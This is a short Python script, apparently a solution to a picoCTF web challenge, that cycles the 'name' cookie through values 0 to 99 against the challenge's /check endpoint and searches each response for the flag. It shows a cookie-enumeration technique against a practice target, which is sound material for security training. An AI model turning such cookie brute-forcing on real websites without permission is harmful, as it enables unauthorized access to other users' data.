#!/usr/bin/env python

import pwn
import requests
import re

regex = "picoCTF{.*?}"
url = "http://mercury.picoctf.net:17781/check"
s = requests.Session()
boucle = True

def Exploit():
    pwn.info("Searching for the flag")
    while boucle:
        for miaou in range (0,100):
            if miaou % 5 == 0:
                if miaou > 0:
                    pwn.info("{} iterations".format(miaou))
                else:
                    pwn.info("{} iteration".format(miaou))
            cookies = {'name': str(miaou)}
            req = s.get(url, cookies=cookies)
            req = req.content
            result = re.findall(regex, str(req))
            flag = result
            if result:
                for f in flag:
                    pwn.warn("After {} iterations".format(miaou))
                    pwn.warn("Cookie was: {}".format(cookies))
                    pwn.success("Flag is: {}".format(f))
                    break
                return
Exploit()
